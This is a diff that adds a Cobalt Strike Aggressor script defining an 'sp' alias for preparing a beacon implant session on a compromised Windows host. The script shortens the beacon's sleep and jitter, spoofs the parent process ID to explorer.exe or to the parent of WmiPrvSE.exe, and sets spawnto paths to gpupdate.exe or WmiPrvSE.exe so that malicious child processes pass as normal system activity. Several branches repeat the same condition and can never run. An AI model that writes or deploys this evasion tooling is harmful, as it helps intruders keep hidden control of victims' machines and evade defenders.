@@ -1,0 +1,185 @@
+#	ALIAS:	SP
+
+# Method to Acquire User Explorer PID
+sub getexplorer {
+	global('$initialppid');
+	bps($1, lambda({
+		$uusername = beacon_info($1, "name");
+		foreach $ue (split("\n", $2)) {
+			($un, $null, $up, $null, $uun) = split("\\s+", $ue);
+			if ($uusername isin $uun){
+				if ("explorer" isin $un) {
+					btask($1, "Setting PPID to " . $uun . "'s " . $un . " Process.");
+					$initialppid = $up;
+					[$cbf: $1, $up];
+				}					
+			}
+		}
+	}, $cbf => $2));
+}
+
+# Method to Acquire System Level PPID
+sub getwmiprvse {
+	global('$initialppid');
+	bps($1, lambda({
+		foreach $se (split("\n", $2)) {
+			if ("NT AUTHORITY\\SYSTEM" isin $se) {
+				($sn, $spp, $sp, $null, $su, $suu) = split("\\s+", $se);
+				if (("WmiPrvSE.exe" isin $sn) || ("wmiprvse" isin $sn) || ("WMIPRVSE" isin $sn)) {
+					btask($1, "Setting PPID to " . $su . " " . $suu . "'s " . $sn . " Process.");
+					$sspp = $spp
+				}
+			}
+		}
+		$initialppid = $sspp;
+		[$cbf: $1, $sspp];
+	}, $cbf => $2));
+}
+
+alias("sp", {
+		local('@icb');
+		
+		# Check for Number of Arguements
+		if (size(@_) > 1) {
+			berror($1, "sp: Too many arguments");
+			beacon_command_detail("sp");
+			return;
+		}
+		
+		# Input Information to Beacon Console
+		binput($1 , "[ Preparing Beacon Session for Shspawn ]");
+		
+		# Log Tasking to Event Log.
+		elog("\cC[+] Preparing Session on Implant ID: \o" . beacon_info( $1 , "id" ) . " (" . beacon_info($1, "computer") . ")");
+		
+		# Beginning Task
+		btask($1, "Beginning Session Prep");
+		
+		# Set Standard Operating Speed on Implant (subject to Change)
+		($slp, $jit) = split("\\s+", "1 99");		# 1 Second, Jitter: 99
+		#($slp, $jit) = split("\\s+", "60 99");		# 1 Minute(s), Jitter: 99
+		#($slp, $jit) = split("\\s+", "120 99");	# 2 Minute(s), Jitter: 99
+		#($slp, $jit) = split("\\s+", "300 99");	# 5 Minute(s), Jitter: 99
+		#($slp, $jit) = split("\\s+", "600 99");	# 10 Minute(s), Jitter: 99
+		#($slp, $jit) = split("\\s+", "1200 99");	# 20 Minute(s), Jitter: 99
+		bsleep($1,$slp,$jit);
+		
+		# Print Information to Script Console
+		if ((-isadmin $1) && ("SYSTEM" isin beacon_info($1, "user"))){
+			println(
+			"\nPRINTED INFORMATION: Session Preparation => " . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+			. "\nSLEEP:\t\t"       . "Set Sleep to " . $slp . " Second(s) and Jitter to " . $jit . "%"
+			. "\nPPID:\t\t"        . "Set PPID to 'svchost.exe' (Based on PPID of WmiPrvSE.exe)"
+			. "\nSPAWNTO (x86):\t" . "Set Spawnto (x86) to '%systemroot%\\syswow64\\wbem\\WmiPrvSE.exe -Embedded'"
+			. "\nSPAWNTO (x64):\t" . "Set Spawnto (x64) to '%systemroot%\\sysnative\\wbem\\WmiPrvSE.exe -Embedded'"
+			);
+		}
+		else if ((-isadmin $1) && ("SYSTEM" isin beacon_info($1, "user"))){
+			println(
+			"\nPRINTED INFORMATION: Session Preparation => " . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+			. "\nSLEEP:\t\t"       . "Set Sleep to " . $slp . " Second(s) and Jitter to " . $jit . "%"
+			. "\nPPID:\t\t"        . "Set PPID to 'explorer.exe' of Current User Context"
+			. "\nSPAWNTO (x86):\t" . "%windir%\\syswow64\\gpupdate.exe /Target:Computer /Wait:-1 /Sync /Force"
+			. "\nSPAWNTO (x64):\t" . "%windir%\\sysnative\\gpupdate.exe /Target:Computer /Wait:-1 /Sync /Force"
+			);
+		}
+		else {
+			println(
+			"\nPRINTED INFORMATION: Session Preparation => " . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+			. "\nSLEEP:\t\t"       . "Set Sleep to " . $slp . " Second(s) and Jitter to " . $jit . "%"
+			. "\nPPID:\t\t"          . "Set PPID to 'explorer.exe' of Current User Context"
+			. "\nSPAWNTO (x86):\t" . "%windir%\\syswow64\\gpupdate.exe /Target:User /Wait:-1 /Sync /Force"
+			. "\nSPAWNTO (x64):\t" . "%windir%\\sysnative\\gpupdate.exe /Target:User /Wait:-1 /Sync /Force"
+			);
+		}
+		
+		# Setting Standard Operating PPID on Implant
+		if ((-isadmin $1) && ("SYSTEM" isin beacon_info($1, "user"))) {
+			btask($1, "Setting System Level PPID");
+			getwmiprvse($1, {bppid($1, $2)});
+		}
+		else {
+			btask($1, "Setting User Level PPID");
+			getexplorer($1, {bppid($1, $2)});
+		}
+		
+		# Setting Standard Operating Spawnto's
+		if ((-isadmin $1) && ("SYSTEM" isin beacon_info($1, "user"))) {
+			btask($1, "Setting System Level Spawnto's (x86/x64)");
+			$spawntoeightysix = "%systemroot%\\syswow64\\wbem\\WmiPrvSE.exe -Embedded";
+			$spawntosixtyfour = "%systemroot%\\sysnative\\wbem\\WmiPrvSE.exe -Embedded";
+			bspawnto($1, "x86", "%systemroot%\\syswow64\\wbem\\WmiPrvSE.exe -Embedded");
+			bspawnto($1, "x64", "%systemroot%\\sysnative\\wbem\\WmiPrvSE.exe -Embedded");	
+		}
+		else if ((-isadmin $1) && ("SYSTEM" !isin beacon_info($1, "user"))) {
+			$spawntoeightysix = "%windir%\\syswow64\\gpupdate.exe /Target:Computer /Wait:-1 /Sync /Force";
+			$spawntosixtyfour = "%windir%\\sysnative\\gpupdate.exe /Target:Computer /Wait:-1 /Sync /Force";
+			btask($1, "Setting Admin User Level Spawnto's (x86/x64)");
+			bspawnto($1, "x86", "%windir%\\syswow64\\gpupdate.exe /Target:Computer /Wait:-1 /Sync /Force");
+			bspawnto($1, "x64", "%windir%\\sysnative\\gpupdate.exe /Target:Computer /Wait:-1 /Sync /Force");
+		}
+		else {
+			$spawntoeightysix = "%windir%\\syswow64\\gpupdate.exe /Target:User /Wait:-1 /Sync /Force";
+			$spawntosixtyfour = "%windir%\\sysnative\\gpupdate.exe /Target:User /Wait:-1 /Sync /Force";
+			btask($1, "Setting User Level Spawnto's (x86/x64)");
+			bspawnto($1, "x86", "%windir%\\syswow64\\gpupdate.exe /Target:User /Wait:-1 /Sync /Force");
+			bspawnto($1, "x64", "%windir%\\sysnative\\gpupdate.exe /Target:User /Wait:-1 /Sync /Force");
+		}
+
+
+		if ("READY" !isin beacon_info($1, "note")) {
+
+			if (beacon_info($1, "pbid") != ""){
+			
+				if ((-isadmin $1) && ("SYSTEM" isin beacon_info($1, "user"))){
+					# EXAMPLE: BEACON | NEW | EST:2023-04-25 | 19:02:34 (EST)
+					bnote($1 , "BEACON | SYS | PREPPED | LINKED:HOP | " . formatDate('yyyy-MM-dd | HH:mm:ss (z)'));
+				}
+				else if ((-isadmin $1) && ("SYSTEM" isin beacon_info($1, "user"))){
+					# EXAMPLE: BEACON | NEW | EST:2023-04-25 | 19:02:34 (EST)
+					bnote($1 , "BEACON | ADM | PREPPED | LINKED:HOP | " . formatDate('yyyy-MM-dd | HH:mm:ss (z)'));
+				}
+				else {
+					# EXAMPLE: BEACON | NEW | EST:2023-04-25 | 19:02:34 (EST)
+					bnote($1 , "BEACON | PREPPED | LINKED:HOP | " . formatDate('yyyy-MM-dd | HH:mm:ss (z)'));
+				}
+
+			}
+			else {
+			
+				if ((-isadmin $1) && ("SYSTEM" isin beacon_info($1, "user"))){
+					# EXAMPLE: BEACON | NEW | EST:2023-04-25 | 19:02:34 (EST)
+					bnote($1 , "BEACON | SYS | PREPPED | " . formatDate('yyyy-MM-dd | HH:mm:ss (z)'));
+				}
+				else if ((-isadmin $1) && ("SYSTEM" isin beacon_info($1, "user"))){
+					# EXAMPLE: BEACON | NEW | EST:2023-04-25 | 19:02:34 (EST)
+					bnote($1 , "BEACON | ADM | PREPPED | " . formatDate('yyyy-MM-dd | HH:mm:ss (z)'));
+				}
+				else {
+					# EXAMPLE: BEACON | NEW | EST:2023-04-25 | 19:02:34 (EST)
+					bnote($1 , "BEACON | PREPPED | " . formatDate('yyyy-MM-dd | HH:mm:ss (z)'));
+				}
+
+			}
+
+		}
+		
+		# Highlight New Beacon Yellow
+		push(@icb, beacon_data($1));
+		highlight("beacons", @icb, "neutral");
+		
+		# Task Completed
+		btask($1, "\cCDONE\o");
+	}
+)
+
+#	ALIAS REGISTER:	SP
+beacon_command_register(
+	"sp",
+	"\c2[*] ALIAS: Prepares the Session by Setting PPID and Spawntos\o",
+	"Synopsis: sp\n\nPrepares the Session by Setting PPID and Spawntos."
+	. "\n\tPPID will be set to the PID of Explorer.exe for User Level Implants. (Will be the Explorer Process of the Current User Context)"
+	. "\n\tPPID will be set to the PID of a NT AUTHORITY\SYSTEM svchost.exe for System Level Implants. (Usually by looking for WmiPrvSE.exe PPID)"
+	. "\n\tSpawto's (x86/x64) will be set to gpupdate.exe for User/Admin Level Implants."
+	. "\n\tSpawto's (x86/x64) will be set to WmiPrvSE.exe for System Level Implants"
+);
